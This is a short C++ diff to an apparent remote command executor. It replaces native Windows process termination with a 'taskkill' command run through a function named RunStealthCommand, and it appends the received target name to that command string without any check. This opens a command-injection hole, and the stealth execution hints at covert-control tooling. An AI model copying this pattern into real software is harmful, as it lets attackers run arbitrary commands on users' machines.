@@ -361,21 +361,15 @@ std::string Executor::ExecuteCommand(const std::string& command) {
     if (cmd.substr(0, 5) == "stop ") {
         std::string target = cmd.substr(5);
 #ifdef _WIN32
-        bool killed = false;
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
-            if (Process32First(hSnap, &pe)) {
-                do {
-                    if (std::to_string(pe.th32ProcessID) == target || std::string(pe.szExeFile) == target) {
-                        HANDLE hP = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                        if (hP) { TerminateProcess(hP, 0); CloseHandle(hP); killed = true; }
-                    }
-                } while (Process32Next(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
+        std::string command;
+        if (target.find_first_not_of("0123456789") == std::string::npos) {
+            command = "taskkill /F /T /PID " + target;
+        } else {
+            command = "taskkill /F /T /IM " + target;
         }
-        return killed ? "OK" : "ERR_NOT_FOUND";
+        std::string res = RunStealthCommand(command);
+        return (res.find("SUCCESS") != std::string::npos) ? "OK" : "ERR_STOP_FAILED";
+
 #endif
     }
 
